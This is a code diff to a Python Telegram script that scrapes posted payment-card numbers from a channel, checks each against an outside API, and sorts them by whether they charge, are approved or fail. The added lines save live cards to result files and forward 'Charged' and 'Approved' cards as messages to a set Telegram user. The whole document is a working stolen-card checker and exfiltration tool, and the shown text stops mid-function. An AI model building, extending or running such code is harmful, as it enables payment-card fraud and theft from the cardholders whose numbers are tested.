@@ -1,3 +1,4 @@
+import os
 import re
 import asyncio
 import aiohttp
@@ -5,11 +6,18 @@ import aiohttp
 from telethon import TelegramClient, events
 
 # Data required
-api_id = 0 # Change to your own api_id
-api_hash = 'xxx' # Change to your own api_hash
+api_id = 0 # CHANGE TO YOUR API ID
+api_hash = 'xxx' # CHANGE TO YOUR API HASH
 
 # URL
-api_url = 'https://api.ulems.me'
+api_url = '' # CHANGE TO YOUR API URL
+
+# Scrape and Forward
+t_scrape = '' # Telegram Channel to Scrape
+t_username = '' # Telegram username to Forward
+
+if os.path.exists('result') == False:
+    os.makedirs('result')
 
 client = TelegramClient('telegram', api_id, api_hash)
 
@@ -21,20 +29,50 @@ async def RequestURL(session, card):
             message = data.get('message', '')
 
             if message == 'Charged':
+                f = os.path.join('result', 'charged.txt')
+                with open(f, 'a') as file:
+                    file.write(f"{card}\n")
                 print(f'[HITS] {card} => Charged')
+
+                # Forward Telegram
+                telesage = (
+                    f"┏━━━━━━━\n"
+                    f"┣ ➡️ : `{card}`\n"
+                    f"┣ ➡️ : **$1 Charged !**\n"
+                    f"┗━━━━━━━━━━━\n"
+                )
+                await client.send_message(t_username, telesage)
             elif message == 'Approved':
+                f = os.path.join('result', 'approved.txt')
+                with open(f, 'a') as file:
+                    file.write(f"{card}\n")
                 print(f'[LIVE] {card} => Approved')
+
+                # Forward Telegram
+                telesage = (
+                    f"┏━━━━━━━\n"
+                    f"┣ ➡️ : `{card}`\n"
+                    f"┣ ➡️ : **Approved !**\n"
+                    f"┗━━━━━━━━━━━\n"
+                )
+                await client.send_message(t_username, telesage)
             elif message == 'Your card has insufficient funds.':
+                f = os.path.join('result', 'insuf.txt')
+                with open(f, 'a') as file:
+                    file.write(f"{card}\n")
                 print(f'[LIVE] {card} => Your card has insufficient funds.')
             elif message == "Your card's security code is incorrect.":
+                f = os.path.join('result', 'ccn.txt')
+                with open(f, 'a') as file:
+                    file.write(f"{card}\n")
                 print(f'[LIVE] {card} => Your card\'s security code is incorrect.')
             else:
                 print(f'[DIED] {card} => {message}')
     except Exception as e:
-        print(f'[ERR] {card} - {e}')
+        print(f'[EROR] {card} => {e}')
 
 # Message handler
-@client.on(events.NewMessage(chats='lustyscrapper'))
+@client.on(events.NewMessage(chats=t_scrape))
 async def handler(event):
     raw = event.text
     message_raw = re.findall(
